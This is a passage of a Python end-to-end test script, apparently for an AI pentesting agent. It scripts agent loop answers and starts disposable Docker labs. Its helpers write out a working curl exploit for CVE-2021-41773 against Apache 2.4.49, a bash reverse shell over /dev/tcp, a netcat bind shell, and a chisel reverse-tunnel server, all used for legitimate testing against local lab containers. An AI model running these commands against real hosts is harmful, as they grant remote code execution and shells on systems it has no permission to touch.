    facts: dict = field(default_factory=dict)
    errors: list[str] = field(default_factory=list)
    outcome: object = None
    questions: int = 0
    approvals: int = 0

    def last_think(self) -> str:
        return self.thinks[-1] if self.thinks else ""


def setup_answers(target: str) -> dict:
    j = json.dumps
    return {
        "scope_guardrail": j({"allowed": True, "reason": "a throwaway local lab, in scope"}),
        "classify": j({"attack_path_type": "cve_exploit", "required_phase": "informational", "confidence": 0.9,
                       "reasoning": "a lab web server with a known CVE", "target_host": target, "target_port": 80}),
        "deep_think": j({"situation_assessment": "a local lab", "competing_hypotheses": [],
                         "attack_vectors_identified": ["web server CVE"], "recommended_approach": "follow the script",
                         "priority_order": ["the scripted steps"], "risks_and_mitigations": "a throwaway lab"}),
        "report": "# FU-P7 e2e\n\nScripted run of tests/kali_reverse_ports_live.py.",
        "other": "OK.",
    }


def run_loop_chat(out: Out, label: str, http: tc.Http, project_id: str, question: str,
                  driver_token: str, moves: list[Callable], *, target: str = "lab", cap_s: float = 900) -> Chat:
    """Sends `question` on a fresh chat of `project_id` over the agent socket (as the drawer does,
    with the person's ticket; approvals and confirmations answered approve, as the person) while a
    driver thread answers the run's loop steps over /api/mcp-server: the setup purposes with fixed
    answers, each think step with the first move that answers it. A move gets (prompt, chat) and
    returns a decision dict, None (nothing to say: the next move is asked) or AGAIN (answered
    with a preparatory Kali step, the same move is asked at the next think)."""
    chat = Chat(label, tc.new_session_id())
    answers = setup_answers(target)
    driver = tc.LoopDriver(base_url(), driver_token, chat.session_id)
    stop = threading.Event()
    index = {"move": 0, "prep": 0}

    def think(prompt: str) -> dict:
        chat.thinks.append(prompt)
        while index["move"] < len(moves):
            got = moves[index["move"]](prompt, chat)
            if got is AGAIN:
                index["prep"] += 1
                if index["prep"] > 4:
                    chat.errors.append(f"move {index['move']} still waiting after 4 preparatory steps")
                    index["move"] += 1
                    continue
                return use_tool("a preparatory Kali step, as the payload block asks",
                                "kali_shell", {"command": "echo FU-P7-PREP"})
            index["move"] += 1
            if got is not None:
                return got
        return complete()

    def drive() -> None:
        while not stop.is_set():
            step = driver.next_step(25)
            if step is None:
                if driver.refused:
                    chat.errors.append(f"the MCP server refused the driver: {driver.refused}")
                    return
                continue
            purpose = step.get("purpose")
            try:
                if purpose == "think":
                    answer = json.dumps(think(str(step.get("fullPrompt") or "")))
                    chat.did.append(f"think#{len(chat.thinks)}: {json.loads(answer).get('action')} "
                                    f"{json.loads(answer).get('tool_name') or ''}".strip())
                elif purpose in answers:
                    answer = answers[purpose]
                    chat.did.append(str(purpose))
                else:
                    driver.call("loop_submit_step", {"stepId": step["stepId"], "declined": True,
                                                     "reason": "fu-p7 driver: unexpected purpose"})
                    chat.errors.append(f"unexpected step purpose {purpose}")
                    continue
            except Exception as exc:  # a move's own failure ends the run, never the driver silently
                chat.errors.append(f"move failed: {type(exc).__name__}: {one_line(exc, 160)}")
                answer = json.dumps(complete("the e2e script failed"))
            if not driver.submit(step, answer):
                chat.errors.append(f"submitting the {purpose} answer was refused")
            if purpose == "report":
                return

    def on_frame(msg: dict) -> None:
        kind = msg.get("type")
        if kind == "question_request":
            chat.questions += 1
        elif kind in ("approval_request", "tool_confirmation_request"):
            chat.approvals += 1

    worker = threading.Thread(target=drive, daemon=True)
    worker.start()
    stack = SimpleNamespace(redact=out.redact, agent_ws=agent_ws_url())
    try:
        chat.outcome = tc.run_chat(stack, http, "", project_id, question, cap_sec=cap_s,
                                   session_id=chat.session_id, on_frame=on_frame)
    except Exception as exc:
        chat.errors.append(f"the chat socket failed: {type(exc).__name__}")
    finally:
        # A normal run's driver has returned after the report step; one whose run ended
        # without a report stops at its next poll.
        stop.set()
        worker.join(timeout=60)
    ended = getattr(chat.outcome, "ended", "none")
    out.info(f"{label}: chat {ended}, {len(chat.thinks)} think steps, {chat.approvals} approvals, "
             f"{chat.questions} questions; driver: {', '.join(chat.did) or 'nothing'}")
    return chat


# ---- labs (synthetic, throwaway, labelled RUN_LABEL) --------------------------------

def pentest_network() -> str:
    if os.environ.get("FU_P7_LAB_NETWORK"):
        return os.environ["FU_P7_LAB_NETWORK"]
    nets = ((inspect(PROXY) or {}).get("NetworkSettings") or {}).get("Networks") or {}
    return next((n for n in nets if n.endswith("pentest-net")), "redamon_pentest-net")


class Lab:
    """A guinea pig on the pentest network, joined to a person's sandbox network on demand
    (the sandbox reaches nothing else; the orchestrator disconnects it when that network goes)."""

    def __init__(self, name: str, image: str, cmd: list[str]):
        self.name, self.net = name, pentest_network()
        rc, _, err = docker("run", "-d", "--rm", "--name", name, "--label", f"{RUN_LABEL}=1",
                            "--network", self.net, image, *cmd)
        if rc != 0:
            raise Fatal(f"starting the lab {name} failed: {one_line(err, 160)}")
        self.pentest_ip = network_ip(name, self.net)
        self.hostname = ((inspect(name) or {}).get("Config") or {}).get("Hostname") or ""

    def join(self, user_id: str, view: str = "own") -> str:
        net = sandbox_network(user_id, view)
        nets = ((inspect(self.name) or {}).get("NetworkSettings") or {}).get("Networks") or {}
        if net not in nets:
            rc, _, err = docker("network", "connect", net, self.name)
            if rc != 0:
                raise Fatal(f"connecting {self.name} to {net} failed: {one_line(err, 160)}")
        return network_ip(self.name, net)

    def stop(self) -> None:
        docker("rm", "-f", self.name)


def apache_lab(nonce: str) -> Lab:
    """testing/guinea_pigs/apache_2.4.49 (CVE-2021-41773), root in the container, port 80."""
    return Lab(f"fu-p7-apache-{nonce}", APACHE_IMAGE, [])


def bind_lab(nonce: str) -> Lab:
    """A shell bound on LAB_SHELL_PORT (busybox `nc -lk -e`): what a bind payload connects to."""
    return Lab(f"fu-p7-bind-{nonce}", BUSYBOX_IMAGE,
               ["sh", "-c", f"exec nc -lk -p {LAB_SHELL_PORT} -e /bin/sh"])


def rce_command(lab_host: str, body: str) -> str:
    """kali_shell's command: `body` run by the lab's /bin/sh through CVE-2021-41773 (single-quoted:
    nothing of it is expanded in the sandbox). `body` must hold no single quote."""
    if "'" in body:
        raise ValueError("the RCE body holds a single quote")
    return (f"printf '%s' 'echo Content-Type: text/plain; echo; {body}' | curl -s --path-as-is -m 30 "
            f"--data-binary @- \"http://{lab_host}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh\"")


def reverse_shell_body(marker: str, lhost: str, lport: int) -> str:
    """The lab prints `marker` and its uid, then its bash dials lhost:lport (after 3 s, so the
    console has returned; detached, so the CGI request ends)."""
    return (f"echo {marker} $(id -u); setsid bash -c \"sleep 3; bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\" "
            f"</dev/null >/dev/null 2>&1 &")


def probe_connect(host: str, port: int, payload: str) -> tuple[int, str]:
    """A one-shot busybox on the pentest network that dials host:port and sends `payload`:
    (exit code, output). A refused connection is a non-zero exit."""
    rc, out, err = docker("run", "--rm", "--label", f"{RUN_LABEL}=1", "--network", pentest_network(),
                          BUSYBOX_IMAGE, "sh", "-c", f"echo {payload} | nc -w 3 {host} {port}; echo rc=$?",
                          timeout=60)
    m = re.search(r"rc=(\d+)", out)
    return (int(m.group(1)) if m else rc or 1), (out + err)


class ChiselEdge:
    """A chisel server from the Kali image's binary standing in for a person's VPS, on a network
    of its own, joined to each person's sandbox network on demand."""

    def __init__(self, nonce: str):
        self.name, self.net = f"fu-p7-chisel-{nonce}", f"fu-p7-edge-{nonce}"
        rc, _, err = docker("network", "create", "--label", f"{RUN_LABEL}=1", self.net)
        if rc != 0:
            raise Fatal(f"creating {self.net} failed: {one_line(err, 160)}")
        rc, _, err = docker("run", "-d", "--rm", "--name", self.name, "--label", f"{RUN_LABEL}=1",
                            "--network", self.net, "--entrypoint", "/usr/local/bin/chisel", KALI_IMAGE,
                            "server", "--port", "9090", "--reverse")
        if rc != 0:
            raise Fatal(f"starting the chisel edge failed: {one_line(err, 160)}")

    def url_for(self, user_id: str, view: str = "own") -> str:
        net = sandbox_network(user_id, view)
        nets = ((inspect(self.name) or {}).get("NetworkSettings") or {}).get("Networks") or {}
        if net not in nets:
            rc, _, err = docker("network", "connect", net, self.name)
            if rc != 0:
                raise Fatal(f"connecting the edge to {net} failed: {one_line(err, 160)}")
        return f"http://{network_ip(self.name, net)}:9090"

    def log(self) -> str:
        rc, out, err = docker("logs", self.name)
        return out + err

    def stop(self) -> None:
        docker("rm", "-f", self.name)
        docker("network", "rm", self.net)
